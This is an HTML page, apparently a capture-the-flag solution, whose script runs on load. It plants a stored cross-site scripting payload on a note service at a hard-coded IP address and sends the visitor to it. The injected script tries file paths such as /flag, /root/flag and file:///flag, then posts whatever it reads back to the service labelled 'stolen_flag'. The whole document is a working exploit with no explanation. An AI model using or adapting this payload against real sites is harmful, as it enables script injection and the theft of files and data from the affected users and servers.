<!DOCTYPE html>
<html>
<body>

<script>
async function go() {
    try {
        let res = await fetch("http://35.240.202.177:7305/create", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                title: "exploit",
                content: `<script>
(async () => {
    const paths = [
        "/flag",
        "/app/flag",
        "/home/ctf/flag",
        "/root/flag",
        "/flag.txt",
        "file:///flag",
        "file:///app/flag"
    ];

    let content = "FLAG_NOT_FOUND";

    for (let p of paths) {
        try {
            let res = await fetch(p);
            if (res.ok) {
                content = await res.text();
                break;
            }
        } catch (_) {}
    }

    await fetch("http://35.240.202.177:7305/create", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
            "title": "stolen_flag",
            "content": content
        })
    });
})();
</` + `script>`
            })
        });

        let j = await res.json();
        location = "http://35.240.202.177:7305/get?id=" + j.data.id;
    } catch (e) {
        document.body.innerText = e.toString();
    }
}
go();
</script>

</body>
</html>
